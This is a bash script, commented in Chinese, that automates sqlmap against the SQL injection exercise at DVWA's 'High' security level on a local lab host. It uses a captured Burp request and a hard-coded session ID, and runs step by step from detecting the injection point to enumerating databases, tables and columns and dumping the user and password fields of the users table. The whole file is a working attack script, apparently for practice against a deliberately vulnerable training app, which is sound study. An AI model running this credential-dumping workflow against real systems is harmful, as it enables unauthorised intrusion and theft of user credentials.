#!/bin/bash

#配置
TARGET_URL="http://192.168.0.103:8080/vulnerabilities/sqli/"    # 结果页面URL
PHPSESSID="orlatscvk7pkupj0bqjhknvp41"                                         # 登录后的会话ID
REQUEST_FILE="/home/gaoyin/Desktop/sqli_high.txt"                                       # Burp请求文件

# 颜色输出
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 检查sqlmap是否安装
check_sqlmap() {
    if ! command -v sqlmap &> /dev/null; then
        echo -e "${RED}[-] sqlmap未安装，请执行: sudo apt install sqlmap${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] sqlmap已就绪${NC}"
}

# 检查请求文件是否存在
check_request_file() {
    if [ ! -f "$REQUEST_FILE" ]; then
        echo -e "${RED}[-] 请求文件不存在: $REQUEST_FILE${NC}"
        echo -e "${YELLOW}[!] 请先用Burp抓包保存为 $REQUEST_FILE${NC}"
        echo -e "${YELLOW}    抓包方法: 点击弹窗 -> 输入ID -> Submit -> 复制POST请求保存${NC}"
        exit 1
    fi
    echo -e "${GREEN}[+] 请求文件已找到: $REQUEST_FILE${NC}"
}

# 带second-url的sqlmap命令模板（High级别的关键）
run_sqlmap() {
    local task=$1
    local cmd=$2
    echo -e "${GREEN}[*] $task${NC}"
    echo -e "${YELLOW}执行: $cmd${NC}"
    eval $cmd
    echo -e "${GREEN}[+] $task 完成${NC}"
    echo ""
}

# 主流程
main() {
    echo -e "${GREEN}========================================${NC}"
    echo -e "${GREEN}DVWA SQL Injection High - sqlmap 脚本${NC}"
    echo -e "${GREEN}========================================${NC}"
    
    check_sqlmap
    check_request_file
    
    # 基础命令模板（核心参数：-r 指定请求文件，--second-url 指定结果页面，--batch 自动应答）
    BASE_CMD="sqlmap -r \"$REQUEST_FILE\" --second-url=\"$TARGET_URL\" --batch"
    
    echo -e "${YELLOW}[!] 目标URL: $TARGET_URL${NC}"
    echo -e "${YELLOW}[!] 请求文件: $REQUEST_FILE${NC}"
    echo ""
    
    # 第1步：检测注入点
    run_sqlmap "1/5 检测注入点" "$BASE_CMD"
    
    # 第2步：获取所有数据库
    run_sqlmap "2/5 枚举所有数据库" "$BASE_CMD --dbs"
    
    # 第3步：获取 dvwa 库的所有表
    run_sqlmap "3/5 枚举 dvwa 数据库的表" "$BASE_CMD -D dvwa --tables"
    
    # 第4步：获取 users 表的列结构
    run_sqlmap "4/5 枚举 users 表的列" "$BASE_CMD -D dvwa -T users --columns"
    
    # 第5步：导出 users 表数据
    run_sqlmap "5/5 导出 users 表数据" "$BASE_CMD -D dvwa -T users -C user,password --dump"
    

    echo -e "${GREEN}[+] 脚本执行完成！${NC}"
}

# 如果用户想单独执行某一步，可以用命令行参数
case "$1" in
    "detect")   check_sqlmap; check_request_file; sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch ;;
    "dbs")      check_sqlmap; check_request_file; sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch --dbs ;;
    "tables")   check_sqlmap; check_request_file; sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa --tables ;;
    "columns")  check_sqlmap; check_request_file; sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users --columns ;;
    "dump")     check_sqlmap; check_request_file; sqlmap -r "$REQUEST_FILE" --second-url="$TARGET_URL" --batch -D dvwa -T users -C user,password --dump ;;
    *) main ;;
esac